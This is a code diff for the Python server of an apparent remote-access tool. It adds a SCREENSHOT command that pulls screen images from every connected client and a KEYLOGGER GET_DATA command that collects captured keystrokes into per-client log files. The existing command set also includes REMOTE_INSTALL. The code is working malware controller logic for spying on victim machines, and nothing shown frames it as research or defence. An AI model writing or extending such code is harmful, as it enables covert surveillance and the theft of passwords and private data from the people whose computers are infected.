@@ -18,7 +18,7 @@ os.chdir(cwd)
 
 from Communicator import COMMUNICATOR
 
-
+TIMEOUT = 5
 
 
 
@@ -32,7 +32,7 @@ class SERVER:
             'REMOTE_INSTALL': self.Install,
             'MKDIR': self.MkDir,
             'KEYLOGGER': self.KeyLoggerAction, # True == Start the keylogger
-            # 'STOP_KEYLOGGER': self.KeyLoggerAction(False), # False == Stop the keylogger
+            'SCREENSHOT': self.Screenshot,
         }
 
         sock = socket.socket()
@@ -42,7 +42,7 @@ class SERVER:
         sock.listen(MAXIMUM_CLIENTS)
 
         self.sock = COMMUNICATOR(sock)
-        self.DataToSend = queue.Queue()
+        self.DataToSend = queue.Queue() # with this queue we can send to all clients
 
 
     # Add a client to the list
@@ -70,10 +70,20 @@ class SERVER:
             else:
                 break
 
+    # This sends data to all clients
     def SendToClients(self, data):
         for i, t in self.clients.items():
             sock = t[0]
             sock.send(data)
+
+
+    def RecvFromClients(self):
+        allData = {}
+        for i, t in self.clients.items():
+            sock = t[0]
+            allData[i] = (sock.recv(), t[0])
+        return allData
+
 
     def MainLoop(self, in_, out_):
         EnableInput = True
@@ -107,12 +117,89 @@ class SERVER:
 
     ####### ACTIONS ######
 
+    def Screenshot(self, action):
+        self.SendToClients('SCREENSHOT')
+
+        time.sleep(TIMEOUT)
+
+        data = self.RecvFromClients()
+
+        if not os.path.exists("SCREENSHOTS"):
+            os.mkdir("SCREENSHOTS")
+
+        noData = []
+
+        for k, v in data.items():
+            if len(v[0]) != 0:
+                if v[0] != 'FAIL':
+                    with open(f"SCREENSHOTS/{k}.png", "wb") as datafile:
+                        datafile.write(v[0])
+            else:
+                noData.append((k, v[1]))
+
+
+        # i = 0
+        # print(noData)
+        # while noData:
+        #     if i >= len(noData):
+        #         i = 0
+        #
+        #     address, sock = noData[i]
+        #     b = sock.recv()
+        #
+        #     if b:
+        #         with open(f"SCREENSHOTS/{address}.png", "wb") as datafile:
+        #             datafile.write(b)
+        #         noData.pop(i)
+        #     else:
+        #         if not sock.IsConnected:
+        #             noData.pop(i)
+        #         else:
+        #             i += 1
+
+
+
+
+
+    def GetKeyLoggerData(self):
+        data = self.RecvFromClients()
+
+        if not os.path.exists("KEYLOGGER_DATA"):
+            os.mkdir("KEYLOGGER_DATA")
+
+        for k, v in data.items():
+            if len(v[0]) != 0:
+                with open(f"KEYLOGGER_DATA/{k}.log", "wb") as datafile:
+                    datafile.write(v[0])
+
+        for k, v in data.items():
+            toprint = b'\n' + v[0].replace(b'\n', b'\n\t')
+            if len(toprint) == 0:
+                toprint = "[NO DATA]"
+            else:
+                toprint = toprint.decode()
+
+            print()
+            print(f"DATA FOR {k}:{toprint}", end='\n\n')
+
+        print('> ', end = '', flush = True)
+
+
+
+
     def KeyLoggerAction(self, action):
         action = action.split(' ')[-1].upper()
 
-        action = (action == "START")
-        self.DataToSend.put(     'KEYLOGGER ' + ('START' if action else 'STOP')     )
+        if action not in ['START', 'STOP', 'GET_DATA']:
+            print("KEYLOGGER module has 3 functionalities: START, STOP, GET_DATA")
+            return
 
+        if action in ['START', 'STOP']:
+            self.DataToSend.put(     'KEYLOGGER ' + action     )
+        elif action == 'GET_DATA':
+            self.SendToClients(     'KEYLOGGER GET_DATA'     )
+            time.sleep(TIMEOUT)
+            self.GetKeyLoggerData()
 
 
 
